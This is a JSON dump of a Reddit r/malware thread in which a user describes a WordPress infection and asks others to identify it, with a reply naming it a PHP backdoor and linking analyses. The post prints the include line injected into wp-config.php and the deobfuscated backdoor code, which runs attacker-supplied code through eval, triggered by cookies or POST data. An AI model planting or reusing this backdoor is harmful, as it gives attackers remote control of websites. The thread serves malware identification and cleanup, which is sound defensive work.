@@ -1,0 +1,44 @@
+{
+    "op": {
+        "upvote_ratio": null,
+        "selftext": "Hey,\n\nI've found a Wordpress infection when asked by a relative to search for the reason of bugs like getting http 500 often. Maybe someone has analysed that kind of malware already and can point me to anything known about this. For example how the WP got infected or what the script was after would be valueable information I would love to find.\n\n&amp;#x200B;\n\nI've found code inserted into the wp-config.php:\n\n    &lt;?php \n    /*70a40*/\n    @include \"\\057kun\\ ... \\141.ic\\157\"; //I shortened string to prevent giving away the fs structure\n    /*70a40*/\n\nThe .ico file included uses multiple functions to obfuscate the code it is trying to execute (like using the filename of the .ico as part of the restoration process and random comments whereever PHP would allow them). So I spent a few minutes to restore the code and found this:\n\n    &lt;?php\n    @ini_set('error_log', NULL); \n    @ini_set('log_errors', 0); \n    @ini_set('max_execution_time', 0); \n    @error_reporting(0); \n    @set_time_limit(0); \n    if(!defined(\"PHP_EOL\")) { define(\"PHP_EOL\", \"\\n\"); } \n    if(!defined(\"DIRECTORY_SEPARATOR\")) { define(\"DIRECTORY_SEPARATOR\", \"/\"); } \n    if (!defined('file_put_contents ')) { define('file_put_contents ', 1); \n    $sfieiwk = '5b782706-15ed-4043-84a7-c11ad9bc732b'; \n    global $sfieiwk; \n    function vxnfnqz($ktexxhx) { \n    \tif (strlen($ktexxhx) &lt; 4) { return \"\"; } \n    \t$voaucdl = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\"; \n    \t$klrlbfvdwjeim = str_split($voaucdl); \n    \t$klrlbfvdwjeim = array_flip($klrlbfvdwjeim); \n    \t$ejpztpqj = 0; \n    \t$klrlbfvdwmrjjgi = \"\"; \n    \t$ktexxhx = preg_replace(\"~[^A-Za-z0-9\\+\\/\\=]~\", \"\", $ktexxhx); \n    \tdo { \n    \t\t$ucknekqq = $klrlbfvdwjeim[$ktexxhx[$ejpztpqj++]]; \n    \t\t$qasgns = $klrlbfvdwjeim[$ktexxhx[$ejpztpqj++]]; \n    \t\t$rjxgtx = $klrlbfvdwjeim[$ktexxhx[$ejpztpqj++]]; \n    \t\t$ywimur = $klrlbfvdwjeim[$ktexxhx[$ejpztpqj++]]; \n    \t\t$etoxtibi = ($ucknekqq &lt;&lt; 2) | ($qasgns &gt;&gt; 4); \n    \t\t$rcadhaj = (($qasgns &amp; 15) &lt;&lt; 4) | ($rjxgtx &gt;&gt; 2); \n    \t\t$parpyof = (($rjxgtx &amp; 3) &lt;&lt; 6) | $ywimur; \n    \t\t$klrlbfvdwmrjjgi = $klrlbfvdwmrjjgi . chr($etoxtibi); \n    \t\tif ($rjxgtx != 64) { \n    \t\t\t$klrlbfvdwmrjjgi = $klrlbfvdwmrjjgi . chr($rcadhaj); \n    \t\t} \n    \t\tif ($ywimur != 64) { \n    \t\t\t$klrlbfvdwmrjjgi = $klrlbfvdwmrjjgi . chr($parpyof); \n    \t\t} \n    \t} \n    \twhile ($ejpztpqj &lt; strlen($ktexxhx)); \n    \treturn $klrlbfvdwmrjjgi; \n    } \n    if (!function_exists('file_put_contents')) { \n    \tfunction file_put_contents($klrlbfvd, $kbmxor, $tokixrbn = False) { \n    \t\t$kiwtuy = $tokixrbn == 8 ? 'a' : 'w'; \n    \t\t$mvquay = @fopen($klrlbfvd, $kiwtuy); \n    \t\tif ($mvquay === False) { \n    \t\t\treturn 0; \n    \t\t} else { \n    \t\t\tif (is_array($kbmxor)) \n    \t\t\t\t$kbmxor = implode($kbmxor); \n    \t\t\t$kbmxorrfmwmcg = fwrite($mvquay, $kbmxor); \n    \t\t\tfclose($mvquay); \n    \t\t\treturn $kbmxorrfmwmcg; \n    \t\t} \n    \t} \n    } \n    if (!function_exists('file_get_contents')) {\n    \tfunction file_get_contents($vppaqbjl) { \n    \t\t$gtaili = fopen($vppaqbjl, \"r\"); \n    \t\t$wsgwwbaj = fread($gtaili, filesize($vppaqbjl)); \n    \t\tfclose($gtaili); return $wsgwwbaj; } \n    \t\techo \"trying to read \".$vppaqbjl.\"&lt;&lt;&lt;br&gt;\";\n    \t} \n    \tfunction lyrtrnbe() { \n    \t\treturn trim(preg_replace(\"/\\(.*\\$/\", '', __FILE__)); \n    \t} \n    \tfunction utmfccp($klrlbfvdwqnomdd, $kdsnnlv) { \n    \t\t$ldxcryj = \"\"; \n    \t\tfor ($ejpztpqj=0; $ejpztpqj$vtugdlhh) { \n    \t\t\tif ($txkcsri) { \n    \t\t\t\tif (strcmp($txkcsri, $clsbch) == 0) {\n    \t\t\t\t\teval($vtugdlhh); \n    \t\t\t\t\tbreak; \n    \t\t\t\t} \n    \t\t\t} else { \n    \t\t\t\teval($vtugdlhh); \n    \t\t\t} \n    \t\t} \n    \t} \n    \tforeach (array_merge($_COOKIE, $_POST) as $klrlbfvdjlthjh =&gt; $klrlbfvdwqnomdd) { \n    \t\t$klrlbfvdwqnomdd = @unserialize(szvhas(vxnfnqz($klrlbfvdwqnomdd), $klrlbfvdjlthjh)); \n    \t\tif (isset($klrlbfvdwqnomdd['ak']) &amp;&amp; $sfieiwk==$klrlbfvdwqnomdd['ak']) { \n    \t\t\tif ($klrlbfvdwqnomdd['a'] == 'i') { \n    \t\t\t\t$ejpztpqj = Array( 'pv' =&gt; @phpversion(), 'sv' =&gt; '2.0-1', 'ak' =&gt; $klrlbfvdwqnomdd['ak'], ); \n    \t\t\t\techo @serialize($ejpztpqj); \n    \t\t\t\texit; \n    \t\t\t} elseif ($klrlbfvdwqnomdd['a'] == 'e') { \n    \t\t\t\teval($klrlbfvdwqnomdd['d']); \n    \t\t\t} elseif ($klrlbfvdwqnomdd['a'] == 'plugin') { \n    \t\t\t\tif($klrlbfvdwqnomdd['sa'] == 'add') { \n    \t\t\t\t\tmrtrts($klrlbfvdwqnomdd['p'], $klrlbfvdwqnomdd['d']); \n    \t\t\t\t} elseif($klrlbfvdwqnomdd['sa'] == 'rem') { \n    \t\t\t\t\thfpzhwps($klrlbfvdwqnomdd['p']); \n    \t\t\t\t} \n    \t\t\t} \n    \t\t\techo $klrlbfvdwqnomdd['ak']; \n    \t\t\texit(); \n    \t\t} \n    \t} \n    \tshgnqlky(); \n    }\n\nI will look into the code more when I find the time but I thought I could ask before that if someone knows that type of infection and maybe what that could is intended to do.",
+        "title": "Wordpress Infection (including an .ico file filled with obfuscated code)",
+        "score": 8,
+        "id": "bpq6u5",
+        "commsNum": 2,
+        "timeStamp": "2019/05/17-04:43:42",
+        "author_name": "Shakto",
+        "is_self": true,
+        "locked": false,
+        "num_comments": 2,
+        "over_18": false,
+        "spoiler": false,
+        "subreddit": "malware",
+        "stickied": false,
+        "url": "https://www.reddit.com/r/Malware/comments/bpq6u5/wordpress_infection_including_an_ico_file_filled/"
+    },
+    "posts": {
+        "enxpeyd": {
+            "comment": "Thanks, the first link seems to describe exactly the infection I'm dealing with.",
+            "timeStamp": "2019/05/17-11:45:31",
+            "id": "enxpeyd",
+            "is_submitter": true,
+            "link_id": "t3_bpq6u5",
+            "parent_id": "t1_enwluwx",
+            "score": 2,
+            "stickied": false,
+            "author_name": "Shakto"
+        },
+        "enwluwx": {
+            "comment": "I think you'll find that's a backdoor that supports plugins. These appear to be analyses of the same code or closely related code:\n\n[https://www.masswerk.at/nowgobang/2019/anatomy-of-a-wp-backdoor](https://www.masswerk.at/nowgobang/2019/anatomy-of-a-wp-backdoor)\n\n[https://medium.com/@pmarrapese/analysis-of-a-php-backdoor-c9ee3e60e810](https://medium.com/@pmarrapese/analysis-of-a-php-backdoor-c9ee3e60e810)\n\nYou can see that it claims to be v2.01: \"'sv' =&gt; '2.0-1'\".\n\nI've caught an apparently earlier, unobscured version ('1.0-2') version of that backdoor:\n\n[https://github.com/bediger4000/php-malware-analysis/tree/master/backdoors/cscript](https://github.com/bediger4000/php-malware-analysis/tree/master/backdoors/cscript)",
+            "timeStamp": "2019/05/17-06:22:29",
+            "id": "enwluwx",
+            "is_submitter": false,
+            "link_id": "t3_bpq6u5",
+            "parent_id": "t3_bpq6u5",
+            "score": 3,
+            "stickied": false,
+            "author_name": "bediger4000"
+        }
+    }
+}
